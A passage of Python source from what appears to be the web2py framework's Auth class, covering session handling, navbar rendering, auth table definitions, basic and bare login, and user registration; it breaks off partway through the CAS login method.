table::\n\n        auth.add_permission(group_id, 'edit', db.sometable)\n        @auth.requires_permission('edit', db.sometable)\n\n    Or to a specific record::\n\n        auth.add_permission(group_id, 'edit', db.sometable, 45)\n        @auth.requires_permission('edit', db.sometable, 45)\n\n    If authorization is not granted calls::\n\n        auth.settings.on_failed_authorization\n\n    Other options::\n\n        auth.settings.mailer=None\n        auth.settings.expiration=3600 # seconds\n\n        ...\n\n        ### these are messages that can be customized\n        ...\n\n    \"\"\"\n\n    @staticmethod\n    def get_or_create_key(filename=None, alg='sha512'):\n        request = current.request\n        if not filename:\n            filename = os.path.join(request.folder, 'private', 'auth.key')\n        if os.path.exists(filename):\n            key = open(filename, 'r').read().strip()\n        else:\n            key = alg + ':' + web2py_uuid()\n            open(filename, 'w').write(key)\n        return key\n\n    def url(self, f=None, args=None, vars=None, scheme=False):\n        if args is None:\n            args = []\n        if vars is None:\n            vars = {}\n        return URL(c=self.settings.controller,\n                   f=f, args=args, vars=vars, scheme=scheme)\n\n    def here(self):\n        return URL(args=current.request.args, vars=current.request.get_vars)\n\n    def __init__(self, environment=None, db=None, mailer=True,\n                 hmac_key=None, controller='default', function='user',\n                 cas_provider=None, signature=True, secure=False,\n                 csrf_prevention=True, propagate_extension=None,\n                 url_index=None):\n\n        ## next two lines for backward compatibility\n        if not db and environment and isinstance(environment, DAL):\n            db = environment\n        self.db = db\n        self.environment = current\n        self.csrf_prevention = csrf_prevention\n        request = current.request\n        session = current.session\n        auth = session.auth\n        self.user_groups = auth and auth.user_groups or {}\n        if secure:\n            request.requires_https()\n        now = request.now\n        # if we have auth info\n        #    if not expired it, used it\n        #    if expired, clear the session\n        # else, only clear auth info in the session\n        if auth:\n            delta = datetime.timedelta(days=0, seconds=auth.expiration)\n            if auth.last_visit and auth.last_visit + delta > now:\n                self.user = auth.user\n                # this is a trick to speed up sessions to avoid many writes\n                if (now - auth.last_visit).seconds > (auth.expiration / 10):\n                    auth.last_visit = request.now\n            else:\n                self.user = None\n                if session.auth:\n                    del session.auth\n                session.renew(clear_session=True)\n        else:\n            self.user = None\n            if session.auth:\n                del session.auth\n        # ## what happens after login?\n\n        url_index = url_index or URL(controller, 'index')\n        url_login = URL(controller, function, args='login',\n                        extension = propagate_extension)\n        # ## what happens after registration?\n\n        settings = self.settings = Settings()\n        settings.update(Auth.default_settings)\n        settings.update(\n            cas_domains=[request.env.http_host],\n            enable_tokens=False,\n            cas_provider=cas_provider,\n            cas_actions=dict(login='login',\n                             validate='validate',\n                             servicevalidate='serviceValidate',\n                             proxyvalidate='proxyValidate',\n                             logout='logout'),\n            extra_fields={},\n            actions_disabled=[],\n            controller=controller,\n            function=function,\n            login_url=url_login,\n            logged_url=URL(controller, function, args='profile'),\n            download_url=URL(controller, 'download'),\n            mailer=(mailer is True) and Mail() or mailer,\n            on_failed_authorization = URL(controller, function, args='not_authorized'),\n            login_next = url_index,\n            login_onvalidation = [],\n            login_onaccept = [],\n            login_onfail = [],\n            login_methods = [self],\n            login_form = self,\n            logout_next = url_index,\n            logout_onlogout = None,\n            register_next = url_index,\n            register_onvalidation = [],\n            register_onaccept = [],\n            verify_email_next = url_login,\n            verify_email_onaccept = [],\n            profile_next = url_index,\n            profile_onvalidation = [],\n            profile_onaccept = [],\n            retrieve_username_next = url_index,\n            retrieve_password_next = url_index,\n            request_reset_password_next = url_login,\n            reset_password_next = url_index,\n            change_password_next = url_index,\n            change_password_onvalidation = [],\n            change_password_onaccept = [],\n            retrieve_password_onvalidation = [],\n            request_reset_password_onvalidation = [],\n            request_reset_password_onaccept = [],\n            reset_password_onvalidation = [],\n            reset_password_onaccept = [],\n            hmac_key = hmac_key,\n            formstyle = current.response.formstyle,\n            label_separator = current.response.form_label_separator\n        )\n        settings.lock_keys = True\n        # ## these are messages that can be customized\n        messages = self.messages = Messages(current.T)\n        messages.update(Auth.default_messages)\n        messages.update(ajax_failed_authentication=\n                        DIV(H4('NOT AUTHORIZED'),\n                            'Please ',\n                            A('login',\n                              _href=self.settings.login_url +\n                                    ('?_next=' + urllib.quote(current.request.env.http_web2py_component_location))\n                              if current.request.env.http_web2py_component_location else ''),\n                            ' to view this content.',\n                            _class='not-authorized alert alert-block'))\n        messages.lock_keys = True\n\n        # for \"remember me\" option\n        response = current.response\n        if auth and auth.remember_me:\n            # when user wants to be logged in for longer\n            response.session_cookie_expires = auth.expiration\n        if signature:\n            self.define_signature()\n        else:\n            self.signature = None\n\n    def get_vars_next(self):\n        next = current.request.vars._next\n        if isinstance(next, (list, tuple)):\n            next = next[0]\n        return next\n\n    def _get_user_id(self):\n        \"\"\"accessor for auth.user_id\"\"\"\n        return self.user and self.user.id or None\n\n    user_id = property(_get_user_id, doc=\"user.id or None\")\n\n    def table_user(self):\n        return self.db[self.settings.table_user_name]\n\n    def table_group(self):\n        return self.db[self.settings.table_group_name]\n\n    def table_membership(self):\n        return self.db[self.settings.table_membership_name]\n\n    def table_permission(self):\n        return self.db[self.settings.table_permission_name]\n\n    def table_event(self):\n        return self.db[self.settings.table_event_name]\n\n    def table_cas(self):\n        return self.db[self.settings.table_cas_name]\n\n    def table_token(self):\n        return self.db[self.settings.table_token_name]\n\n    def _HTTP(self, *a, **b):\n        \"\"\"\n        only used in lambda: self._HTTP(404)\n        \"\"\"\n\n        raise HTTP(*a, **b)\n\n    def __call__(self):\n        \"\"\"\n        Example:\n            Use as::\n\n                def authentication():\n                    return dict(form=auth())\n\n        \"\"\"\n\n        request = current.request\n        args = request.args\n        if not args:\n            redirect(self.url(args='login', vars=request.vars))\n        elif args[0] in self.settings.actions_disabled:\n            raise HTTP(404)\n        if args[0] in ('login', 'logout', 'register', 'verify_email',\n                       'retrieve_username', 'retrieve_password',\n                       'reset_password', 'request_reset_password',\n                       'change_password', 'profile', 'groups',\n                       'impersonate', 'not_authorized', 'confirm_registration', \n                       'bulk_register','manage_tokens'):\n            if len(request.args) >= 2 and args[0] == 'impersonate':\n                return getattr(self, args[0])(request.args[1])\n            else:\n                return getattr(self, args[0])()\n        elif args[0] == 'cas' and not self.settings.cas_provider:\n            if args(1) == self.settings.cas_actions['login']:\n                return self.cas_login(version=2)\n            elif args(1) == self.settings.cas_actions['validate']:\n                return self.cas_validate(version=1)\n            elif args(1) == self.settings.cas_actions['servicevalidate']:\n                return self.cas_validate(version=2, proxy=False)\n            elif args(1) == self.settings.cas_actions['proxyvalidate']:\n                return self.cas_validate(version=2, proxy=True)\n            elif args(1) == self.settings.cas_actions['logout']:\n                return self.logout(next=request.vars.service or DEFAULT)\n        else:\n            raise HTTP(404)\n\n    def navbar(self, prefix='Welcome', action=None,\n               separators=(' [ ', ' | ', ' ] '), user_identifier=DEFAULT,\n               referrer_actions=DEFAULT, mode='default'):\n        \"\"\" Navbar with support for more templates\n        This uses some code from the old navbar.\n\n        Args:\n            mode: see options for list of\n\n        \"\"\"\n        items = []  # Hold all menu items in a list\n        self.bar = ''  # The final\n        T = current.T\n        referrer_actions = [] if not referrer_actions else referrer_actions\n        if not action:\n            action = self.url(self.settings.function)\n\n        request = current.request\n        if URL() == action:\n            next = ''\n        else:\n            next = '?_next=' + urllib.quote(URL(args=request.args,\n                                                vars=request.get_vars))\n        href = lambda function: '%s/%s%s' % (action, function, next\n                                             if referrer_actions is DEFAULT\n                                             or function in referrer_actions\n                                             else '')\n        if isinstance(prefix, str):\n            prefix = T(prefix)\n        if prefix:\n            prefix = prefix.strip() + ' '\n\n        def Anr(*a, **b):\n            b['_rel'] = 'nofollow'\n            return A(*a, **b)\n\n        if self.user_id:  # User is logged in\n            logout_next = self.settings.logout_next\n            items.append({'name': T('Log Out'),\n                          'href': '%s/logout?_next=%s' % (action,\n                                                          urllib.quote(\n                                                          logout_next)),\n                          'icon': 'icon-off'})\n            if not 'profile' in self.settings.actions_disabled:\n                items.append({'name': T('Profile'), 'href': href('profile'),\n                              'icon': 'icon-user'})\n            if not 'change_password' in self.settings.actions_disabled:\n                items.append({'name': T('Password'),\n                              'href': href('change_password'),\n                              'icon': 'icon-lock'})\n\n            if user_identifier is DEFAULT:\n                user_identifier = '%(first_name)s'\n            if callable(user_identifier):\n                user_identifier = user_identifier(self.user)\n            elif ((isinstance(user_identifier, str) or\n                  type(user_identifier).__name__ == 'lazyT') and\n                  re.search(r'%\\(.+\\)s', user_identifier)):\n                user_identifier = user_identifier % self.user\n            if not user_identifier:\n                user_identifier = ''\n        else:  # User is not logged in\n            items.append({'name': T('Log In'), 'href': href('login'),\n                          'icon': 'icon-off'})\n            if not 'register' in self.settings.actions_disabled:\n                items.append({'name': T('Sign Up'), 'href': href('register'),\n                              'icon': 'icon-user'})\n            if not 'request_reset_password' in self.settings.actions_disabled:\n                items.append({'name': T('Lost password?'),\n                              'href': href('request_reset_password'),\n                              'icon': 'icon-lock'})\n            if (self.settings.use_username and not\n                    'retrieve_username' in self.settings.actions_disabled):\n                items.append({'name': T('Forgot username?'),\n                             'href': href('retrieve_username'),\n                             'icon': 'icon-edit'})\n\n        def menu():  # For inclusion in MENU\n            self.bar = [(items[0]['name'], False, items[0]['href'], [])]\n            del items[0]\n            for item in items:\n                self.bar[0][3].append((item['name'], False, item['href']))\n\n        def bootstrap3():  # Default web2py scaffolding\n            def rename(icon): return icon+' '+icon.replace('icon', 'glyphicon')\n            self.bar = UL(LI(Anr(I(_class=rename('icon '+items[0]['icon'])),\n                                 ' ' + items[0]['name'],\n                                 _href=items[0]['href'])), _class='dropdown-menu')\n            del items[0]\n            for item in items:\n                self.bar.insert(-1, LI(Anr(I(_class=rename('icon '+item['icon'])),\n                                           ' ' + item['name'],\n                                           _href=item['href'])))\n            self.bar.insert(-1, LI('', _class='divider'))\n            if self.user_id:\n                self.bar = LI(Anr(prefix, user_identifier,\n                                  _href='#', _class=\"dropdown-toggle\",\n                                  data={'toggle': 'dropdown'}),\n                              self.bar, _class='dropdown')\n            else:\n                self.bar = LI(Anr(T('Log In'),\n                                  _href='#', _class=\"dropdown-toggle\",\n                                  data={'toggle': 'dropdown'}), self.bar,\n                              _class='dropdown')\n\n        def bare():\n            \"\"\" In order to do advanced customization we only need the\n            prefix, the user_identifier and the href attribute of items\n\n            Examples:\n                Use as::\n\n                # in module custom_layout.py\n                from gluon import *\n                def navbar(auth_navbar):\n                    bar = auth_navbar\n                    user = bar[\"user\"]\n\n                    if not user:\n                        btn_login = A(current.T(\"Login\"),\n                                      _href=bar[\"login\"],\n                                      _class=\"btn btn-success\",\n                                      _rel=\"nofollow\")\n                        btn_register = A(current.T(\"Sign up\"),\n                                         _href=bar[\"register\"],\n                                         _class=\"btn btn-primary\",\n                                         _rel=\"nofollow\")\n                        return DIV(btn_register, btn_login, _class=\"btn-group\")\n                    else:\n                        toggletext = \"%s back %s\" % (bar[\"prefix\"], user)\n                        toggle = A(toggletext,\n                                   _href=\"#\",\n                                   _class=\"dropdown-toggle\",\n                                   _rel=\"nofollow\",\n                                   **{\"_data-toggle\": \"dropdown\"})\n                        li_profile = LI(A(I(_class=\"icon-user\"), ' ',\n                                          current.T(\"Account details\"),\n                                          _href=bar[\"profile\"], _rel=\"nofollow\"))\n                        li_custom = LI(A(I(_class=\"icon-book\"), ' ',\n                                         current.T(\"My Agenda\"),\n                                         _href=\"#\", rel=\"nofollow\"))\n                        li_logout = LI(A(I(_class=\"icon-off\"), ' ',\n                                         current.T(\"logout\"),\n                                         _href=bar[\"logout\"], _rel=\"nofollow\"))\n                        dropdown = UL(li_profile,\n                                      li_custom,\n                                      LI('', _class=\"divider\"),\n                                      li_logout,\n                                      _class=\"dropdown-menu\", _role=\"menu\")\n\n                        return LI(toggle, dropdown, _class=\"dropdown\")\n\n                # in models db.py\n                import custom_layout as custom\n\n                # in layout.html\n                <ul id=\"navbar\" class=\"nav pull-right\">\n                    {{='auth' in globals() and \\\n                      custom.navbar(auth.navbar(mode='bare')) or ''}}</ul>\n\n            \"\"\"\n            bare = {}\n\n            bare['prefix'] = prefix\n            bare['user'] = user_identifier if self.user_id else None\n\n            for i in items:\n                if i['name'] == T('Log In'):\n                    k = 'login'\n                elif i['name'] == T('Sign Up'):\n                    k = 'register'\n                elif i['name'] == T('Lost password?'):\n                    k = 'request_reset_password'\n                elif i['name'] == T('Forgot username?'):\n                    k = 'retrieve_username'\n                elif i['name'] == T('Log Out'):\n                    k = 'logout'\n                elif i['name'] == T('Profile'):\n                    k = 'profile'\n                elif i['name'] == T('Password'):\n                    k = 'change_password'\n\n                bare[k] = i['href']\n\n            self.bar = bare\n\n        options = {'asmenu': menu,\n                   'dropdown': bootstrap3,\n                   'bare': bare\n                   }  # Define custom modes.\n\n        if mode in options and callable(options[mode]):\n            options[mode]()\n        else:\n            s1, s2, s3 = separators\n            if self.user_id:\n                self.bar = SPAN(prefix, user_identifier, s1,\n                                Anr(items[0]['name'],\n                                _href=items[0]['href']), s3,\n                                _class='auth_navbar')\n            else:\n                self.bar = SPAN(s1, Anr(items[0]['name'],\n                                _href=items[0]['href']), s3,\n                                _class='auth_navbar')\n            for item in items[1:]:\n                self.bar.insert(-1, s2)\n                self.bar.insert(-1, Anr(item['name'], _href=item['href']))\n\n        return self.bar\n\n    def __get_migrate(self, tablename, migrate=True):\n\n        if type(migrate).__name__ == 'str':\n            return (migrate + tablename + '.table')\n        elif migrate == False:\n            return False\n        else:\n            return True\n\n    def enable_record_versioning(self,\n                                 tables,\n                                 archive_db=None,\n                                 archive_names='%(tablename)s_archive',\n                                 current_record='current_record',\n                                 current_record_label=None):\n        \"\"\"\n        Used to enable full record versioning (including auth tables)::\n\n            auth = Auth(db)\n            auth.define_tables(signature=True)\n            # define our own tables\n            db.define_table('mything',Field('name'),auth.signature)\n            auth.enable_record_versioning(tables=db)\n\n        tables can be the db (all table) or a list of tables.\n        only tables with modified_by and modified_on fiels (as created\n        by auth.signature) will have versioning. Old record versions will be\n        in table 'mything_archive' automatically defined.\n\n        when you enable enable_record_versioning, records are never\n        deleted but marked with is_active=False.\n\n        enable_record_versioning enables a common_filter for\n        every table that filters out records with is_active = False\n\n        Note:\n            If you use auth.enable_record_versioning,\n            do not use auth.archive or you will end up with duplicates.\n            auth.archive does explicitly what enable_record_versioning\n            does automatically.\n\n        \"\"\"\n        current_record_label = current_record_label or current.T(\n            current_record.replace('_', ' ').title())\n        for table in tables:\n            fieldnames = table.fields()\n            if ('id' in fieldnames and\n                'modified_on' in fieldnames and\n                not current_record in fieldnames):\n                table._enable_record_versioning(\n                    archive_db=archive_db,\n                    archive_name=archive_names,\n                    current_record=current_record,\n                    current_record_label=current_record_label)\n\n    def define_signature(self):\n        db = self.db\n        settings = self.settings\n        request = current.request\n        T = current.T\n        reference_user = 'reference %s' % settings.table_user_name\n\n        def lazy_user(auth=self):\n            return auth.user_id\n\n        def represent(id, record=None, s=settings):\n            try:\n                user = s.table_user(id)\n                return '%s %s' % (user.get(\"first_name\", user.get(\"email\")),\n                                  user.get(\"last_name\", ''))\n            except:\n                return id\n        ondelete = self.settings.ondelete\n        self.signature = Table(\n            self.db, 'auth_signature',\n            Field('is_active', 'boolean',\n                  default=True,\n                  readable=False, writable=False,\n                  label=T('Is Active')),\n            Field('created_on', 'datetime',\n                  default=request.now,\n                  writable=False, readable=False,\n                  label=T('Created On')),\n            Field('created_by',\n                  reference_user,\n                  default=lazy_user, represent=represent,\n                  writable=False, readable=False,\n                  label=T('Created By'), ondelete=ondelete),\n            Field('modified_on', 'datetime',\n                  update=request.now, default=request.now,\n                  writable=False, readable=False,\n                  label=T('Modified On')),\n            Field('modified_by',\n                  reference_user, represent=represent,\n                  default=lazy_user, update=lazy_user,\n                  writable=False, readable=False,\n                  label=T('Modified By'),  ondelete=ondelete))\n\n    def define_tables(self, username=None, signature=None, enable_tokens=False,\n                      migrate=None, fake_migrate=None):\n        \"\"\"\n        To be called unless tables are defined manually\n\n        Examples:\n            Use as::\n\n                # defines all needed tables and table files\n                # 'myprefix_auth_user.table', ...\n                auth.define_tables(migrate='myprefix_')\n\n                # defines all needed tables without migration/table files\n                auth.define_tables(migrate=False)\n\n        \"\"\"\n\n        db = self.db\n        if migrate is None:\n            migrate = db._migrate\n        if fake_migrate is None:\n            fake_migrate = db._fake_migrate\n        settings = self.settings\n        if username is None:\n            username = settings.use_username\n        else:\n            settings.use_username = username\n        settings.enable_tokens = enable_tokens\n        if not self.signature:\n            self.define_signature()\n        if signature == True:\n            signature_list = [self.signature]\n        elif not signature:\n            signature_list = []\n        elif isinstance(signature, Table):\n            signature_list = [signature]\n        else:\n            signature_list = signature\n        is_not_empty = IS_NOT_EMPTY(error_message=self.messages.is_empty)\n        is_crypted = CRYPT(key=settings.hmac_key,\n                           min_length=settings.password_min_length)\n        is_unique_email = [\n            IS_EMAIL(error_message=self.messages.invalid_email),\n            IS_NOT_IN_DB(db, '%s.email' % settings.table_user_name,\n                         error_message=self.messages.email_taken)]\n        if not settings.email_case_sensitive:\n            is_unique_email.insert(1, IS_LOWER())\n        if not settings.table_user_name in db.tables:\n            passfield = settings.password_field\n            extra_fields = settings.extra_fields.get(\n                settings.table_user_name, []) + signature_list\n            if username or settings.cas_provider:\n                is_unique_username = \\\n                    [IS_MATCH('[\\w\\.\\-]+', strict=True,\n                              error_message=self.messages.invalid_username),\n                     IS_NOT_IN_DB(db, '%s.username' % settings.table_user_name,\n                                  error_message=self.messages.username_taken)]\n                if not settings.username_case_sensitive:\n                    is_unique_username.insert(1, IS_LOWER())\n                db.define_table(\n                    settings.table_user_name,\n                    Field('first_name', length=128, default='',\n                          label=self.messages.label_first_name,\n                          requires=is_not_empty),\n                    Field('last_name', length=128, default='',\n                          label=self.messages.label_last_name,\n                          requires=is_not_empty),\n                    Field('email', length=512, default='',\n                          label=self.messages.label_email,\n                          requires=is_unique_email),\n                    Field('username', length=128, default='',\n                          label=self.messages.label_username,\n                          requires=is_unique_username),\n                    Field(passfield, 'password', length=512,\n                          readable=False, label=self.messages.label_password,\n                          requires=[is_crypted]),\n                    Field('registration_key', length=512,\n                          writable=False, readable=False, default='',\n                          label=self.messages.label_registration_key),\n                    Field('reset_password_key', length=512,\n                          writable=False, readable=False, default='',\n                          label=self.messages.label_reset_password_key),\n                    Field('registration_id', length=512,\n                          writable=False, readable=False, default='',\n                          label=self.messages.label_registration_id),\n                    *extra_fields,\n                    **dict(\n                        migrate=self.__get_migrate(settings.table_user_name,\n                                                   migrate),\n                        fake_migrate=fake_migrate,\n                        format='%(username)s'))\n            else:\n                db.define_table(\n                    settings.table_user_name,\n                    Field('first_name', length=128, default='',\n                          label=self.messages.label_first_name,\n                          requires=is_not_empty),\n                    Field('last_name', length=128, default='',\n                          label=self.messages.label_last_name,\n                          requires=is_not_empty),\n                    Field('email', length=512, default='',\n                          label=self.messages.label_email,\n                          requires=is_unique_email),\n                    Field(passfield, 'password', length=512,\n                          readable=False, label=self.messages.label_password,\n                          requires=[is_crypted]),\n                    Field('registration_key', length=512,\n                          writable=False, readable=False, default='',\n                          label=self.messages.label_registration_key),\n                    Field('reset_password_key', length=512,\n                          writable=False, readable=False, default='',\n                          label=self.messages.label_reset_password_key),\n                    Field('registration_id', length=512,\n                          writable=False, readable=False, default='',\n                          label=self.messages.label_registration_id),\n                    *extra_fields,\n                    **dict(\n                        migrate=self.__get_migrate(settings.table_user_name,\n                                                   migrate),\n                        fake_migrate=fake_migrate,\n                        format='%(first_name)s %(last_name)s (%(id)s)'))\n        reference_table_user = 'reference %s' % settings.table_user_name\n        if not settings.table_group_name in db.tables:\n            extra_fields = settings.extra_fields.get(\n                settings.table_group_name, []) + signature_list\n            db.define_table(\n                settings.table_group_name,\n                Field('role', length=512, default='',\n                      label=self.messages.label_role,\n                      requires=IS_NOT_IN_DB(db, '%s.role' % settings.table_group_name)),\n                Field('description', 'text',\n                      label=self.messages.label_description),\n                *extra_fields,\n                **dict(\n                    migrate=self.__get_migrate(\n                        settings.table_group_name, migrate),\n                    fake_migrate=fake_migrate,\n                    format='%(role)s (%(id)s)'))\n        reference_table_group = 'reference %s' % settings.table_group_name\n        if not settings.table_membership_name in db.tables:\n            extra_fields = settings.extra_fields.get(\n                settings.table_membership_name, []) + signature_list\n            db.define_table(\n                settings.table_membership_name,\n                Field('user_id', reference_table_user,\n                      label=self.messages.label_user_id),\n                Field('group_id', reference_table_group,\n                      label=self.messages.label_group_id),\n                *extra_fields,\n                **dict(\n                    migrate=self.__get_migrate(\n                        settings.table_membership_name, migrate),\n                    fake_migrate=fake_migrate))\n        if not settings.table_permission_name in db.tables:\n            extra_fields = settings.extra_fields.get(\n                settings.table_permission_name, []) + signature_list\n            db.define_table(\n                settings.table_permission_name,\n                Field('group_id', reference_table_group,\n                      label=self.messages.label_group_id),\n                Field('name', default='default', length=512,\n                      label=self.messages.label_name,\n                      requires=is_not_empty),\n                Field('table_name', length=512,\n                      label=self.messages.label_table_name),\n                Field('record_id', 'integer', default=0,\n                      label=self.messages.label_record_id,\n                      requires=IS_INT_IN_RANGE(0, 10 ** 9)),\n                *extra_fields,\n                **dict(\n                    migrate=self.__get_migrate(\n                        settings.table_permission_name, migrate),\n                    fake_migrate=fake_migrate))\n        if not settings.table_event_name in db.tables:\n            db.define_table(\n                settings.table_event_name,\n                Field('time_stamp', 'datetime',\n                      default=current.request.now,\n                      label=self.messages.label_time_stamp),\n                Field('client_ip',\n                      default=current.request.client,\n                      label=self.messages.label_client_ip),\n                Field('user_id', reference_table_user, default=None,\n                      label=self.messages.label_user_id),\n                Field('origin', default='auth', length=512,\n                      label=self.messages.label_origin,\n                      requires=is_not_empty),\n                Field('description', 'text', default='',\n                      label=self.messages.label_description,\n                      requires=is_not_empty),\n                *settings.extra_fields.get(settings.table_event_name, []),\n                **dict(\n                    migrate=self.__get_migrate(\n                        settings.table_event_name, migrate),\n                    fake_migrate=fake_migrate))\n        now = current.request.now\n        if settings.cas_domains:\n            if not settings.table_cas_name in db.tables:\n                db.define_table(\n                    settings.table_cas_name,\n                    Field('user_id', reference_table_user, default=None,\n                          label=self.messages.label_user_id),\n                    Field('created_on', 'datetime', default=now),\n                    Field('service', requires=IS_URL()),\n                    Field('ticket'),\n                    Field('renew', 'boolean', default=False),\n                    *settings.extra_fields.get(settings.table_cas_name, []),\n                    **dict(\n                        migrate=self.__get_migrate(\n                            settings.table_cas_name, migrate),\n                        fake_migrate=fake_migrate))\n        if settings.enable_tokens:\n            extra_fields = settings.extra_fields.get(\n                settings.table_token_name, []) + signature_list\n            if not settings.table_token_name in db.tables:\n                db.define_table(\n                    settings.table_token_name,\n                    Field('user_id', reference_table_user, default=None,\n                          label=self.messages.label_user_id),\n                    Field('expires_on', 'datetime', default=datetime.datetime(2999,12,31)),\n                    Field('token',writable=False,default=web2py_uuid(),unique=True),\n                    *extra_fields,\n                    **dict(\n                        migrate=self.__get_migrate(\n                            settings.table_token_name, migrate),\n                        fake_migrate=fake_migrate))\n        if not db._lazy_tables:\n            settings.table_user = db[settings.table_user_name]\n            settings.table_group = db[settings.table_group_name]\n            settings.table_membership = db[settings.table_membership_name]\n            settings.table_permission = db[settings.table_permission_name]\n            settings.table_event = db[settings.table_event_name]\n            if settings.cas_domains:\n                settings.table_cas = db[settings.table_cas_name]\n\n        if settings.cas_provider:  # THIS IS NOT LAZY\n            settings.actions_disabled = \\\n                ['profile', 'register', 'change_password',\n                 'request_reset_password', 'retrieve_username']\n            from gluon.contrib.login_methods.cas_auth import CasAuth\n            maps = settings.cas_maps\n            if not maps:\n                table_user = self.table_user()\n                maps = dict((name, lambda v, n=name: v.get(n, None)) for name in\n                            table_user.fields if name != 'id'\n                            and table_user[name].readable)\n                maps['registration_id'] = \\\n                    lambda v, p=settings.cas_provider: '%s/%s' % (p, v['user'])\n            actions = [settings.cas_actions['login'],\n                       settings.cas_actions['servicevalidate'],\n                       settings.cas_actions['logout']]\n            settings.login_form = CasAuth(\n                casversion=2,\n                urlbase=settings.cas_provider,\n                actions=actions,\n                maps=maps)\n        return self\n\n    def log_event(self, description, vars=None, origin='auth'):\n        \"\"\"\n        Examples:\n            Use as::\n\n                auth.log_event(description='this happened', origin='auth')\n\n        \"\"\"\n        if not self.settings.logging_enabled or not description:\n            return\n        elif self.is_logged_in():\n            user_id = self.user.id\n        else:\n            user_id = None  # user unknown\n        vars = vars or {}\n        # log messages should not be translated\n        if type(description).__name__ == 'lazyT':\n            description = description.m\n        self.table_event().insert(\n            description=str(description % vars),\n            origin=origin, user_id=user_id)\n\n    def get_or_create_user(self, keys, update_fields=['email'],\n                           login=True, get=True):\n        \"\"\"\n        Used for alternate login methods:\n        If the user exists already then password is updated.\n        If the user doesn't yet exist, then they are created.\n        \"\"\"\n        table_user = self.table_user()\n        user = None\n        checks = []\n        # make a guess about who this user is\n        for fieldname in ['registration_id', 'username', 'email']:\n            if fieldname in table_user.fields() and \\\n                    keys.get(fieldname, None):\n                checks.append(fieldname)\n                value = keys[fieldname]\n                user = table_user(**{fieldname: value})\n                if user:\n                    break\n        if not checks:\n            return None\n        if not 'registration_id' in keys:\n            keys['registration_id'] = keys[checks[0]]\n        # if we think we found the user but registration_id does not match,\n        # make new user\n        if 'registration_id' in checks \\\n                and user \\\n                and user.registration_id \\\n                and ('registration_id' not in keys or user.registration_id != str(keys['registration_id'])):\n            user = None  # THINK MORE ABOUT THIS? DO WE TRUST OPENID PROVIDER?\n        if user:\n            if not get:\n                # added for register_bare to avoid overwriting users\n                return None\n            update_keys = dict(registration_id=keys['registration_id'])\n            for key in update_fields:\n                if key in keys:\n                    update_keys[key] = keys[key]\n            user.update_record(**update_keys)\n        elif checks:\n            if not 'first_name' in keys and 'first_name' in table_user.fields:\n                guess = keys.get('email', 'anonymous').split('@')[0]\n                keys['first_name'] = keys.get('username', guess)\n            user_id = table_user.insert(**table_user._filter_fields(keys))\n            user = table_user[user_id]\n            if self.settings.create_user_groups:\n                group_id = self.add_group(\n                    self.settings.create_user_groups % user)\n                self.add_membership(group_id, user_id)\n            if self.settings.everybody_group_id:\n                self.add_membership(self.settings.everybody_group_id, user_id)\n            if login:\n                self.user = user\n        return user\n\n    def basic(self, basic_auth_realm=False):\n        \"\"\"\n        Performs basic login.\n\n        Args:\n            basic_auth_realm: optional basic http authentication realm. Can take\n                str or unicode or function or callable or boolean.\n\n        reads current.request.env.http_authorization\n        and returns basic_allowed,basic_accepted,user.\n\n        if basic_auth_realm is defined is a callable it's return value\n        is used to set the basic authentication realm, if it's a string\n        its content is used instead.  Otherwise basic authentication realm\n        is set to the application name.\n        If basic_auth_realm is None or False (the default) the behavior\n        is to skip sending any challenge.\n\n        \"\"\"\n        if not self.settings.allow_basic_login:\n            return (False, False, False)\n        basic = current.request.env.http_authorization\n        if basic_auth_realm:\n            if callable(basic_auth_realm):\n                basic_auth_realm = basic_auth_realm()\n            elif isinstance(basic_auth_realm, (unicode, str)):\n                basic_realm = unicode(basic_auth_realm)\n            elif basic_auth_realm is True:\n                basic_realm = u'' + current.request.application\n            http_401 = HTTP(401, u'Not Authorized', **{'WWW-Authenticate': u'Basic realm=\"' + basic_realm + '\"'})\n        if not basic or not basic[:6].lower() == 'basic ':\n            if basic_auth_realm:\n                raise http_401\n            return (True, False, False)\n        (username, sep, password) = base64.b64decode(basic[6:]).partition(':')\n        is_valid_user = sep and self.login_bare(username, password)\n        if not is_valid_user and basic_auth_realm:\n            raise http_401\n        return (True, True, is_valid_user)\n\n    def login_user(self, user):\n        \"\"\"\n        Logins the `user = db.auth_user(id)`\n        \"\"\"\n        from gluon.settings import global_settings\n        if global_settings.web2py_runtime_gae:\n            user = Row(self.table_user()._filter_fields(user, id=True))\n            delattr(user, 'password')\n        else:\n            user = Row(user)\n            for key, value in user.items():\n                if callable(value) or key == 'password':\n                    delattr(user, key)\n        if self.settings.renew_session_onlogin:\n            current.session.renew(clear_session=not self.settings.keep_session_onlogin)\n        current.session.auth = Storage(user=user,\n                                       last_visit=current.request.now,\n                                       expiration=self.settings.expiration,\n                                       hmac_key=web2py_uuid())\n        self.user = user\n        self.update_groups()\n\n    def _get_login_settings(self):\n        table_user = self.table_user()\n        userfield = self.settings.login_userfield or 'username' \\\n            if 'username' in table_user.fields else 'email'\n        passfield = self.settings.password_field\n        return Storage({\"table_user\": table_user,\n                        \"userfield\": userfield,\n                        \"passfield\": passfield})\n\n    def login_bare(self, username, password):\n        \"\"\"\n        Logins user as specified by username (or email) and password\n        \"\"\"\n        settings = self._get_login_settings()\n        user = settings.table_user(**{settings.userfield: \\\n                       username})\n        if user and user.get(settings.passfield, False):\n            password = settings.table_user[\n                settings.passfield].validate(password)[0]\n            if ((user.registration_key is None or\n                 not user.registration_key.strip()) and\n                password == user[settings.passfield]):\n                self.login_user(user)\n                return user\n        else:\n            # user not in database try other login methods\n            for login_method in self.settings.login_methods:\n                if login_method != self and login_method(username, password):\n                    self.user = user\n                    return user\n        return False\n\n    def register_bare(self, **fields):\n        \"\"\"\n        Registers a user as specified by username (or email)\n        and a raw password.\n        \"\"\"\n        settings = self._get_login_settings()\n        # users can register_bare even if no password is provided, \n        # in this case they will have to reset their password to login\n        if fields.get(settings.passfield):\n            fields[settings.passfield] = \\\n                settings.table_user[settings.passfield].validate(fields[settings.passfield])[0]\n        if not fields.get(settings.userfield):\n            raise ValueError(\"register_bare: \" +\n                             \"userfield not provided or invalid\")\n        user = self.get_or_create_user(fields, login=False, get=False, \n                                       update_fields=self.settings.update_fields)\n        if not user:\n            # get or create did not create a user (it ignores duplicate records)\n            return False\n        return user\n\n    def cas_login(self,\n                  next=DEFAULT,\n                  onvalidation=DEFAULT,\n                  onaccept=DEFAULT,\n                  log=DEFAULT,\n                  version=2,\n                  ):\n        request = current.request\n        response = current.response\n        session = current.session\n        db, table = self.db, self.table_cas()\n        session._cas_service = request.vars.service or session._cas_service\n        if not request.env.http_host in 